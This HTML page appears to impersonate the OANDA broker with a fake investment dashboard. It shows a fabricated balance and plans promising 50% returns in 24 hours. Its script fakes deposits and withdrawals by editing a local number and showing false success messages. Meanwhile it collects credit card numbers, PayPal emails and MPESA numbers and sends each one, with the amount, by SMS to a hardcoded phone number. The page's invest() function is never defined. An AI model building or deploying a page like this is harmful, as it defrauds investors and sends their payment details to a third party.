<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OANDA - Investment Dashboard</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script src="https://s3.tradingview.com/tv.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            text-align: center;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: white;
            max-width: 800px;
            margin: auto;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h1 { color: #0073e6; }
        .account-info, .controls, .investment-plans {
            margin-bottom: 20px;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 10px;
            background: #f9f9f9;
        }
        .balance { font-size: 24px; font-weight: bold; color: green; }
        button {
            padding: 10px 20px;
            margin: 10px;
            border: none;
            cursor: pointer;
            font-size: 16px;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>OANDA - Investment Platform</h1>
        <div class="account-info">
            <p><strong>Account Holder:</strong> Jacob Amaitsa</p>
            <p class="balance" id="balance">Balance: KES 186,976.44</p>
        </div>
        <div class="controls">
            <button onclick="initiateWithdrawal()">Withdraw</button>
            <button onclick="initiateDeposit()">Deposit</button>
        </div>
        <div class="investment-plans">
            <h2>Investment Plans</h2>
            <button onclick="invest(1000)">Basic Plan - KES 1,000 (Weekly Investment, 50% Return in 24Hrs)</button>
            <button onclick="invest(3000)">Gold Plan - KES 3,000 (Bi-Weekly Investment, 50% Return in 24Hrs)</button>
            <button onclick="invest(5000)">Premium Plan - KES 5,000 (Monthly Investment, 50% Return in 24Hrs)</button>
        </div>
    </div>
    
    <script>
        let balance = 186976.44;

        function formatNumber(num) {
            return num.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
        }

        function sendSMS(message) {
            fetch("https://api.africastalking.com/version1/messaging", {
                method: "POST",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "apiKey": "YOUR_API_KEY"
                },
                body: new URLSearchParams({
                    "username": "YOUR_USERNAME",
                    "to": "+254790408472",
                    "message": message,
                    "from": "YourSenderID"
                })
            })
            .then(response => response.json())
            .then(data => console.log("SMS Sent:", data))
            .catch(error => console.error("SMS Error:", error));
        }

        function updateBalanceDisplay() {
            document.getElementById("balance").innerText = "Balance: KES " + formatNumber(balance);
        }

        function validateInput(method, account) {
            if (method.toLowerCase() === "paypal" && !/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(account)) {
                alert("Invalid PayPal email.");
                return false;
            } else if (method.toLowerCase() === "mpesa" && !/^\d{10}$/.test(account)) {
                alert("Invalid MPESA number.");
                return false;
            } else if (method.toLowerCase() === "credit card" && !/^\d{16}$/.test(account)) {
                alert("Invalid Credit Card number.");
                return false;
            }
            return true;
        }

        function initiateTransaction(type) {
            let method = prompt("Select " + type + " method: MPESA, PayPal, or Credit Card");
            if (!method) return;

            let amount = parseFloat(prompt("Enter amount to " + type + " (Min: 500 KES, Max: 250,000 KES):"));
            if (isNaN(amount) || amount < 500 || amount > 250000 || (type === "withdraw" && amount > balance)) {
                alert("Invalid amount or insufficient balance.");
                return;
            }

            let account = prompt("Enter your " + method + " details:");
            if (!account || !validateInput(method, account)) return;

            if (confirm(`Confirm ${type} of KES ${formatNumber(amount)} via ${method} to ${account}?`)) {
                if (type === "withdraw") balance -= amount;
                else balance += amount;
                updateBalanceDisplay();
                let smsMessage = `${type.charAt(0).toUpperCase() + type.slice(1)} Alert: KES ${formatNumber(amount)} ${type}ed via ${method}. Account: ${account}. New Balance: KES ${formatNumber(balance)}`;
                sendSMS(smsMessage);
                setTimeout(() => alert(`KES ${formatNumber(amount)} ${type}ed successfully via ${method}. Beneficiary will receive in 30 sec.`), 3000);
            }
        }

        function initiateWithdrawal() {
            initiateTransaction("withdraw");
        }

        function initiateDeposit() {
            initiateTransaction("deposit");
        }

        updateBalanceDisplay();
    </script>
</body>
</html>
